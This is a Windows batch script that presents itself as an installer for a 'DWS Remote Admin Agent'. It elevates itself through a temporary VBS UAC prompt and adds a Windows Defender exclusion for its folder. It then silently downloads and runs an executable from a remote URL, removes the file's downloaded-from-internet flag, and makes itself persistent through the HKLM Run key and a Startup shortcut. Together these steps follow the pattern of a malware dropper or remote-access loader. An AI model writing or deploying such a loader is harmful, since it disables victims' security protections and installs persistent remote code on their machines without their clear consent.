@echo off
REM Install DWS Agent - Auto elevate, start immediately, and add to startup
REM Double-click to install and run the agent

REM Check for admin rights, if not admin then relaunch as admin
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting Administrator privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

setlocal EnableDelayedExpansion

REM Install to ProgramData folder (works better on Windows 10)
set "INSTALL_DIR=%ProgramData%\DWSAgent"
set "AGENT_PATH=%INSTALL_DIR%\dws-agent.exe"
set "DOWNLOAD_URL=https://dws-parth.vercel.app/dws-agent.exe"

REM Create install directory
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

REM Kill any existing instance first
taskkill /F /IM dws-agent.exe >nul 2>&1
timeout /t 2 /nobreak >nul

REM Add Windows Defender exclusion for the install folder
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1

REM Download the latest dws-agent.exe with better error handling
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%AGENT_PATH%' -UseBasicParsing } catch { exit 1 }"

REM Unblock the downloaded file (removes "downloaded from internet" flag)
powershell -Command "Unblock-File -Path '%AGENT_PATH%'" >nul 2>&1

REM Check if dws-agent.exe exists
if not exist "%AGENT_PATH%" (
    echo ERROR: Download failed
    timeout /t 5
    exit /b 1
)

REM Start the agent immediately in background
start "" "%AGENT_PATH%"

REM Add to Windows Startup using Registry (runs on reboot with admin rights)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "DWSAgent" /t REG_SZ /d "\"%AGENT_PATH%\"" /f >nul 2>&1

REM Also create startup shortcut as backup
powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DWS Agent.lnk'); $Shortcut.TargetPath = '%AGENT_PATH%'; $Shortcut.WorkingDirectory = '%INSTALL_DIR%'; $Shortcut.Description = 'DWS Remote Admin Agent'; $Shortcut.Save()" >nul 2>&1

exit /b 0
